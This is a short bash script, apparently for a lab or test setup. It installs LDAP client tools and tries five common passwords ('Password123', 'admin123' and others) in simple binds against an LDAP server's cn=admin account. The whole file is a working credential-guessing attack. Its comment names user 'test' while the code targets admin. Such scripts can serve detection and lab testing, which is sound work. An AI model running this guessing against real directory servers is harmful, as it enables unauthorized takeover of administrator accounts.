#!/bin/bash
# Attempt LDAP simple binds for user "test" with several password guesses.
# Assumes Alpine base; installs ldap client tools if missing.

set -u

# Ensure ldapwhoami is available (Alpine: openldap-clients)
if ! command -v ldapwhoami >/dev/null 2>&1; then
    apk add --no-cache openldap-clients >/dev/null
fi

LDAP_URI="ldap://${LDAP_SRV_IP}"
LDAP_BIND_DN="cn=admin,$LDAP_SUFFIX"

# Five password variants to try
PASSWORDS=(
  "Password123"
  "password"
  "Test12345"
  "admin123"
  "qwerty123"
)

echo "Starting LDAP auth attempts against ${LDAP_URI} as ${LDAP_BIND_DN}"

for pw in "${PASSWORDS[@]}"; do
    echo -n "Trying password '${pw}': "
    ldapwhoami -x -D "${LDAP_BIND_DN}" -w "${pw}" -H "${LDAP_URI}"
done
